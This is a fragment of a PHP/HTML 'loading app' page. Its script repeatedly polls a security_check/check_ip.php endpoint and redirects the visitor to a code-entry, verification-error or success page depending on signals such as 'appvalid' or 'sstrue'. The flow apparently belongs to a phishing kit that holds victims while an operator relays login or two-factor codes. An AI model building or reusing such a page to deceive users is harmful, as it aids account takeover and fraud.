...
<body>
    ...
    <main class="main-wrapper">
        <div class="content-container">
            ...
            <div class="form-card loading-card">
                ...
                <h1 class="page-title"><?= t('loading_app_title') ?></h1>
    ...
    <script>
    let checksCount = 0;
    const MAX_CHECKS = 60; // 90 seconds
    ...
    function checkAppStatus() {
        ...
        fetch('./security_check/check_ip.php?t=' + Date.now())
            ...
            .then(data => {
                data = data.trim();
                // Check for app validation signals
                if (data === 'appvalid') window.location.href = './code.php';
                else if (data === 'appbad') window.location.href = './verify.php?error=1';
                // Keeping original checks too just in case
                else if (data === 'sstrue') window.location.href = './code.php';
                else if (data === 'ssfalse') window.location.href = './success.php?error=1';
                else setTimeout(checkAppStatus, 1500);
            })
            .catch(e => setTimeout(checkAppStatus, 3000));
    }
    checkAppStatus();
    </script>
</body>
